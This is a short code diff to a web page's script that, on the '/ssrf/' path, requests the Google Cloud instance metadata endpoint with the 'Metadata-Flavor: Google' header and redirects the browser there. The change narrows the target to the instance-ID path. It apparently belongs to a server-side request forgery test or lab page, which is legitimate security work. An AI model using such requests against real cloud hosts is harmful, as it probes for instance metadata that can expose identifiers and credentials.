@@ -10,7 +10,7 @@
     <script>
         document.addEventListener('DOMContentLoaded', (event) => {
             if (window.location.pathname === '/ssrf/') {
-                fetch('http://metadata.google.internal', {
+                fetch('http://metadata/computeMetadata/v1/instance/id', {
                     method: 'GET',
                     headers: {
                         'Metadata-Flavor': 'Google',
@@ -19,7 +19,7 @@
                 })
                 .then(response => {
                     // Handle the response if needed
-                    window.location.href = 'http://metadata.google.internal'; // Redirect
+                    window.location.href = 'http://metadata/computeMetadata/v1/instance/id'; // Redirect
                 })
                 .catch(error => console.error('Error:', error));
             }
